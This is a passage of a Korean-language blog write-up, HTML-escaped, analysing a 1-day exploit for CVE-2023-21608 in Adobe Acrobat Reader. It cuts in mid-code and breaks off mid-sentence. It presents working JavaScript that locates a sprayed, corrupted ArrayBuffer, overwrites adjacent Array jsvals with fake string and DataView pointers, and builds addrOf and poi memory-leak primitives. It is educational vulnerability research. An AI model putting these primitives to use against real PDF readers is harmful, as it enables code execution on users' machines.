        &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(
            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] corrupted array buffer found at &amp;quot;&lt;/span&gt; +
                i +
                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; : length: &amp;quot;&lt;/span&gt; +
                bufs[i].byteLength +
                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; : buf length: &amp;quot;&lt;/span&gt; +
                bufs.length
        );
        &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; uintArr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint32Array&lt;/span&gt;(bufs[i]);

        &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] checking leaked global array...&amp;quot;&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; x = ((bufs.length - i) * &lt;span class=&#34;hljs-number&#34;&gt;0xfff8&lt;/span&gt;) / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;; x &amp;lt; uintArr.length; x++) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uintArr[x] == &lt;span class=&#34;hljs-number&#34;&gt;0x47484950&lt;/span&gt;) {
                arrStart = x - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
                &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] leaked global array found at index:&amp;quot;&lt;/span&gt; + arrStart);
                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
            }
        }

        &lt;span class=&#34;hljs-comment&#34;&gt;// store for recovery&lt;/span&gt;
        originalTargetStrAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
        originalTargetDVAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;];

        &lt;span class=&#34;hljs-comment&#34;&gt;// corrupt for further primitives&lt;/span&gt;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = FAKE_STR;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = FAKE_DV;

        corruptedTypedArr = uintArr;

        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB4E4;&amp;#xC758; length&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; &amp;#xD560;&amp;#xB2F9;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &lt;code&gt;ALLOC_SIZE&lt;/code&gt;(0xffe8)&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; OOB Read/Write&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;sprayArrBuffers&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB4E4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;24188270&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt;  ................
&lt;span class=&#34;hljs-attribute&#34;&gt;24188280&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;47484950&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;db&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;420&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt;  PIHG.... .......
&lt;span class=&#34;hljs-attribute&#34;&gt;24188290&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;dda&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;87&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  .&amp;apos;......QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882a0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882b0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882c0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882d0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882e0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xAC12;&amp;#xB9CC; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC640; &amp;#xB2EC;&amp;#xB9AC; &amp;#xAC01; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xAC12;&amp;#xACFC; &amp;#xD0C0;&amp;#xC785;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xB294; &amp;#xD0DC;&amp;#xADF8; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; jsval&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294;  Adobe Acrobat Reader&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; Javascript &amp;#xC5D4;&amp;#xC9C4;&amp;#xC778; SpiderMonkey&amp;#xC5D0;&amp;#xC11C; jsval&amp;#xC744; &amp;#xD45C;&amp;#xD604;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B8; &amp;#xADF8;&amp;#xB9BC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%206.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9BC;.1: &lt;a href=&#34;https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt; Slide 10&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &lt;code&gt;0db3c420 ffffff85&lt;/code&gt;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC778; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &lt;code&gt;0dda27c0 ffffff87&lt;/code&gt;&amp;#xB294; DataView&amp;#xC778; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Corrupt-Sparyed-Array&#34;&gt;&lt;a href=&#34;#Corrupt-Sparyed-Array&#34; class=&#34;headerlink&#34; title=&#34;Corrupt Sparyed Array&#34;&gt;&lt;/a&gt;Corrupt Sparyed Array&lt;/h3&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xAE30; &amp;#xC704;&amp;#xD574; OOB Read&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;OOB Read&amp;#xB85C; &amp;#xC77D;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;Array[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; 0x47484950&amp;#xACFC; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xC784;&amp;#xC744; &amp;#xC2DD;&amp;#xBCC4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; OOB Read&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xB97C; &amp;#xBE7C;&amp;#xC11C; &lt;code&gt;Array&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xC778;&amp;#xB371;&amp;#xC2A4; &lt;code&gt;arrStart&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xACFC; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;FAKE_STR&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FAKE_DV&lt;/code&gt;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;originalTargetStrAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// corrupted ArrayBuffer&lt;/span&gt;
originalTargetDVAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;];

&lt;span class=&#34;hljs-comment&#34;&gt;// corrupt for further primitives&lt;/span&gt;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = FAKE_STR; &lt;span class=&#34;hljs-comment&#34;&gt;// 0x20000058 + 0x100&lt;/span&gt;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = FAKE_DV; &lt;span class=&#34;hljs-comment&#34;&gt;//0x20000058 + 0x180&lt;/span&gt;

corruptedTypedArr = uintArr;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;FAKE_STR&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FAKE_DV&lt;/code&gt;&amp;#xB294; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC2DC;&amp;#xC791; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; 0x20000058&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xAC01;&amp;#xAC01; 0x100, 0x180 &amp;#xB9CC;&amp;#xD07C; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-AddrOf-amp-poi-Primitives&#34;&gt;&lt;a href=&#34;#3-AddrOf-amp-poi-Primitives&#34; class=&#34;headerlink&#34; title=&#34;3. AddrOf &amp;amp; poi Primitives&#34;&gt;&lt;/a&gt;3. AddrOf &amp;amp; poi Primitives&lt;/h2&gt;&lt;h3 id=&#34;AddrOf-Primitive&#34;&gt;&lt;a href=&#34;#AddrOf-Primitive&#34; class=&#34;headerlink&#34; title=&#34;AddrOf Primitive&#34;&gt;&lt;/a&gt;AddrOf Primitive&lt;/h3&gt;&lt;p&gt;&amp;#xC784;&amp;#xC758;&amp;#xC758; Javascript &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; addrof&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;(&lt;code&gt;corruptedTypedArr&lt;/code&gt;)&amp;#xC640; &lt;code&gt;Array&lt;/code&gt;(&lt;code&gt;modifiedArr&lt;/code&gt;)&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; modifiedArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; arrs.length; i++) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;) {
        modifiedArr = arrs[i];
        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
    }
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = obj;
    addr = corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; addr;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB4E4;&amp;#xC744; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA70; &lt;code&gt;Array[0]&lt;/code&gt;&amp;#xC774; &amp;#xC6D0;&amp;#xBCF8;&amp;#xC778;  0x47484950&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; 0x47484951&amp;#xC778; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &lt;code&gt;modifiedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;corruptedTypedArr[arrStart + 4]&lt;/code&gt;&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;modifiedArr[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; jsval&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC77D;&amp;#xD788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;addrOf&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC774;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;modifiedArr[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xB300;&amp;#xC785;&amp;#xD558;&amp;#xACE0; &lt;code&gt;corruptedTypedArr[arrStart + 4]&lt;/code&gt;&amp;#xB85C; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0; &amp;#xC4F0;&amp;#xC778; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;poi-Primitive&#34;&gt;&lt;a href=&#34;#poi-Primitive&#34; class=&#34;headerlink&#34; title=&#34;poi Primitive&#34;&gt;&lt;/a&gt;poi Primitive&lt;/h3&gt;&lt;p&gt;&lt;code&gt;modifiedArr[1]&lt;/code&gt;&amp;#xC740; &amp;#xC6D0;&amp;#xBCF8; String &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC544;&amp;#xB2CC; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; Fake String&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xB85C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR_START = &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;s2h&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;s&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; n1 = s.charCodeAt(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; n2 = s.charCodeAt(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ((n2 &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) | n1) &amp;gt;&amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;poi&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// leak values at addr by setting it to string ptr&lt;/span&gt;
    corruptedTypedArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = addr;
    val = s2h(modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; val;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;poi&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; Fake String&amp;#xC758; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC744; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFC9;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;modifiedArr[1]&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; Fake String&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xACE0; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &lt;code&gt;s2h&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC22B;&amp;#xC790;&amp;#xB85C; &amp;#xBCC0;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;4-Arbitrary-Address-Read-Write-Primitive&#34;&gt;&lt;a href=&#34;#4-Arbitrary-Address-Read-Write-Primitive&#34; class=&#34;headerlink&#34; title=&#34;4. Arbitrary Address Read/Write Primitive&#34;&gt;&lt;/a&gt;4. Arbitrary Address Read/Write Primitive&lt;/h2&gt;&lt;p&gt;&amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xAD6C;&amp;#xD604;&amp;#xB41C; &lt;code&gt;addrOf&lt;/code&gt;, &lt;code&gt;poi&lt;/code&gt;&amp;#xB85C; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC784;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C; &amp;#xC77D;&amp;#xAE30;/&amp;#xC4F0;&amp;#xAE30;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; 